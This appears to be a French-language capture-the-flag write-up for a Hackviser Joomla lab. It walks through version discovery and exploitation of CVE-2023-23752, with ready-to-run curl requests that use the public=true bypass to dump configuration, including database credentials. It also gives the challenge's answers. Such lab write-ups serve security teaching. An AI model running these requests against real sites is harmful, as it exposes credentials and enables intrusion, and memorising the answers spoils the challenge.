# Writeup Détaillé: Hacking Joomla (Stardust.hv) - Hackviser

## 1. Introduction & Contexte

Dans ce challenge, nous auditons une machine virtuelle nommée `stardust.hv` qui héberge un site web. Notre mission est de trouver des informations critiques sur le système sans avoir d'identifiants au départ.

La cible utilise **Joomla**, qui est un Système de Gestion de Contenu (CMS) très populaire, similaire à WordPress. Comme tout logiciel complexe, s'il n'est pas mis à jour, il peut contenir des failles de sécurité.

## 2. Reconnaissance : Trouver la cible et sa version

Avant d'attaquer, il faut comprendre ce qui tourne sur la machine.

### Vérification de la connexion

Nous commençons par vérifier si la machine est accessible avec un `ping`.

```bash
ping -c 3 stardust.hv
```

*Cela envoie 3 paquets de données à la machine pour voir si elle répond.*

### Identification de la version de Joomla

Connaître la version exacte d'un logiciel est crucial car cela nous permet de chercher des vulnérabilités connues (CVE) spécifiques à cette version.

Joomla stocke souvent sa version dans des fichiers XML accessibles publiquement. Nous avons essayé d'en lire un :

```bash
curl -s http://stardust.hv/administrator/manifests/files/joomla.xml | grep '<version>'
```

* **curl -s** : Télécharge le fichier silencieusement (sans barre de progression).
* **grep** : Filtre le résultat pour n'afficher que la ligne contenant `<version>`.

**Résultat :** Nous avons trouvé la version **4.2.7**.

## 3. Analyse de la Vulnérabilité (CVE-2023-23752)

En cherchant "Joomla 4.2.7 exploit" sur Internet, on tombe rapidement sur la **CVE-2023-23752**.

### Explication simple de la faille

Joomla 4.x a introduit une **API REST**, un moyen pour les programmes de discuter avec le site Joomla. Normalement, l'accès aux configurations sensibles du site devrait être restreint aux administrateurs.

Cependant, dans les versions 4.0.0 à 4.2.7, il existe un défaut de contrôle d'accès. En ajoutant un simple paramètre `public=true` à l'URL de l'API, Joomla désactive ses vérifications de sécurité et **répond poliment avec toute sa configuration**, y compris les mots de passe !

## 4. Exploitation : Le vol de données

Nous allons maintenant interroger cette API bavarde pour récupérer les drapeaux (flags) demandés.

### Étape 1 : Récupérer les 20 premiers paramètres

L'API renvoie les résultats par pages (pagination). Commençons par la première page.

```bash
curl -s "http://stardust.hv/api/index.php/v1/config/application?public=true" | jq
```

* **http://.../config/application** : L'endpoint (l'adresse) qui gère la configuration de l'application.
* **public=true** : L'astuce qui contourne la sécurité.
* **jq** : Un outil qui met en forme le code JSON (le format de réponse) pour qu'il soit lisible par un humain.

Dans cette première réponse, nous trouvons déjà des informations critiques :

* **user** : "joomla" (Nom d'utilisateur de la base de données)
* **password** : "MMfnFL42K9tgUruMGYgRJRX5" (Le mot de passe de la base de données !)
* **db** : "joomla" (Nom de la base de données)

### Étape 2 : Paginer pour trouver la suite

Il nous manque l'email de l'administrateur. Il est probable qu'il soit dans les paramètres suivants qui n'étaient pas affichés sur la première page. Nous demandons donc la page suivante (offset 20).

```bash
curl -s "http://stardust.hv/api/index.php/v1/config/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20" | jq
```

* **page[offset]=20** : On demande à commencer à partir du 20ème résultat.

Dans cette deuxième réponse, nous trouvons :

* **mailfrom** : "<admin@mail.hv>" (L'email utilisé pour envoyer les notifications du site, souvent celui de l'admin).

## 5. Résumé des Réponses

Grâce à ces deux commandes, nous avons répondu à toutes les questions du challenge :

| Question | Réponse | Explication |
| :--- | :--- | :--- |
| **Q9. Version Joomla ?** | **4.2.7** | Trouvée dans le fichier `joomla.xml` au début. |
| **Q10. Email Admin ?** | **<admin@mail.hv>** | Trouvé dans le champ `mailfrom` de la config API (page 2). |
| **Q11. User Database ?** | **joomla** | Trouvé dans le champ `user` de la config API (page 1). |
| **Q12. Password Database ?** | **MMfnFL42K9tgUruMGYgRJRX5** | Trouvé dans le champ `password` de la config API (page 1). |

## Conclusion pour le débutant

Ce challenge montre qu'une simple erreur de configuration dans le code d'un site (ici, l'oubli de vérifier les droits quand `public=true` est présent) peut compromettre toute la sécurité. En tant que hacker éthique, notre rôle est d'identifier ces versions obsolètes pour avertir les administrateurs qu'ils doivent faire une mise à jour immédiate.
